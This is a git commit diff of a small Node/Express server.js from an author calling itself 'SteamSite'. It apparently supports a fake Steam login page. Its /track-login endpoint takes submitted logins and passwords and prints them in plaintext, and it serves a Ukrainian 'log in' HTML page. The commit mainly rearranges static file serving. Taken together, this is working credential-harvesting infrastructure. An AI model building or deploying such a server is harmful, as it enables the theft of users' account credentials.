da0d5ddcb936034010611c6b02611ce4388058a8
SteamSite <newsteamsite@gmail.com>
2025-02-08 16:27:26 +0200

    Update server.js

--- server.js
+++ server.js
@@ -9,21 +9,24 @@ const PORT = 10000;
 app.use(cors());
 app.use(bodyParser.json());
 
+// Роздаємо всі файли з папки "public"
+app.use(express.static(path.join(__dirname, "public")));
+
 app.post("/track-login", (req, res) => {
     const { login, password } = req.body;
 
-		console.log("Success!")
+    console.log("Success!");
     console.log("Login:", login);
     console.log("Password:", password);
 
     res.json({ message: "Дані отримані успішно!" });
 });
 
+// Відправляємо index.html при запиті на головну сторінку
 app.get("/", (req, res) => {
-    console.log("Get req");
-    res.sendFile(path.join(__dirname, "Увійти.html"));
+    res.sendFile(path.join(__dirname, "public", "Увійти.html"));
 });
 
 app.listen(PORT, () => {
-    console.log(`Server is running http://localhost:${PORT}`);
+    console.log(`Server is running at http://localhost:${PORT}`);
 });
